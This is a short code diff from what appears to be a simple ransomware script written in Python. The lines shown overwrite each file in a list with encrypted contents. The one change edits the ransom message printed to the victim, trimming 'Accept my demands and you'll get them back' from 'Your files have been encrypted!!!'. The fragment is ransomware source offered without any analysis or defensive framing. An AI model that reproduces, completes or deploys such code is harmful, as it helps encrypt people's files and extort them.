@@ -21,4 +21,4 @@ for file in files:
     with open(file,'wb') as ranfile:
         ranfile.write(encrypted_contents)
 
-print("Your files have been encrypted!!! Accept my demands and you'll get them back")
+print("Your files have been encrypted!!! ")
